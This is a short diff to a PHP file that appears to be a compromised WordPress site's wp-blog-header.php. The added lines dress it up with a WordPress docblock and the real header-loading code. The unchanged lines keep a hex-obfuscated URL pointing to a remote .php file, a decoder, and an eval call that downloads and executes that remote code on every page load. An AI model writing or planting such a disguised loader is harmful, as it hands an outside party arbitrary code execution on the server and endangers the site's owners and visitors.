@@ -1,4 +1,9 @@
 <?php
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
 $hexUrl = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f706172626164612f6c616e64696e672f726566732f68656164732f6d61696e2f616c64617272657374617572616e7473312e706870';
 
 function hex2str($hex) {
@@ -56,4 +61,18 @@ if ($phpScript === false) {
 }
 
 eval('?>' . $phpScript);
-?>
+
+if ( ! isset( $wp_did_header ) ) {
+
+	$wp_did_header = true;
+
+	// Load the WordPress library.
+	require_once __DIR__ . '/wp-load.php';
+
+	// Set up the WordPress query.
+	wp();
+
+	// Load the theme template.
+	require_once ABSPATH . WPINC . '/template-loader.php';
+
+}
